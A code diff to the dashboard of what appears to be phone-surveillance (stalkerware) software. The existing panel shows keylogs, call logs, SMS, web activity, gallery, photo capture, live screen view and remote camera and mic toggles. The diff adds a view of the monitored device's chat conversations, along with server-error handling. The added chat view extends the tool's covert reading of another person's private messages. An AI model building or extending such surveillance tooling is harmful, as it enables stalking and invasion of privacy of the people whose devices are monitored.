@@ -12,6 +12,7 @@ import WebActivityList from '../components/WebActivityList';
 import NotificationList from '../components/NotificationList';
 import InstalledAppList from '../components/InstalledAppList';
 import KeylogList from '../components/KeylogList';
+import ChatConversations from '../components/ChatConversations';
 import LiveScreenView from '../components/LiveScreenView';
 import GalleryView from '../components/GalleryView';
 import PhotoCaptureView from '../components/PhotoCaptureView';
@@ -48,10 +49,12 @@ function DashboardPage() {
     camera: false,
     mic: false
   });
+  const [fetchError, setFetchError] = useState(null);
 
   useEffect(() => {
     if (token) {
       setIsLoading(true);
+      setFetchError(null);
       const fetchData = async () => {
         try {
           const fetchSafe = async (promise, fallback = []) => {
@@ -64,8 +67,11 @@ function DashboardPage() {
             }
           };
 
-          const [devs, calls, sms, apps, web] = await Promise.all([
-            fetchSafe(dataService.getDevices(token)),
+          const devRes = await dataService.getDevices(token);
+          if (!devRes) throw new Error("Network error: no response from server");
+          const devs = devRes.data;
+
+          const [calls, sms, apps, web] = await Promise.all([
             fetchSafe(dataService.getCallLogs(token)),
             fetchSafe(dataService.getSmsMessages(token)),
             fetchSafe(dataService.getAppUsage(token)),
@@ -85,6 +91,7 @@ function DashboardPage() {
           });
         } catch (error) {
           console.error('Error in fetchData:', error);
+          setFetchError(error.message || 'Failed to connect to the server');
         } finally {
           setIsLoading(false);
         }
@@ -135,6 +142,12 @@ function DashboardPage() {
                   <Smartphone className="w-5 h-5 mr-2 text-indigo-500" />
                   My Devices
                 </h3>
+                {fetchError && (
+                  <div className="mb-6 bg-red-50 border border-red-200 rounded-2xl p-4">
+                    <p className="text-sm font-medium text-red-700">Server Error: {fetchError}</p>
+                    <p className="text-xs text-red-500 mt-1">Check the browser console (F12) for details.</p>
+                  </div>
+                )}
                 <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                   {devices.length === 0 ? (
                     <div className="col-span-2 bg-white rounded-3xl p-12 text-center border border-slate-200 border-dashed">
@@ -247,10 +260,13 @@ function DashboardPage() {
       case 'keylogs':
         return <KeylogList deviceId={selectedDeviceId} />;
 
+      case 'chats':
+        return <ChatConversations deviceId={selectedDeviceId} />;
+
       case 'live-view':
         return (
           <div className="space-y-8">
-            <RemoteActions deviceId={selectedDeviceId} token={token} fullView={false} toggles={toggles} setToggles={setToggles} />
+            <RemoteActions deviceId={selectedDeviceId} token={token} fullView={false} toggles={toggles} setToggles={setToggles} devices={devices} />
             <LiveScreenView selectedDevice={selectedDevice} toggles={toggles} />
           </div>
         );
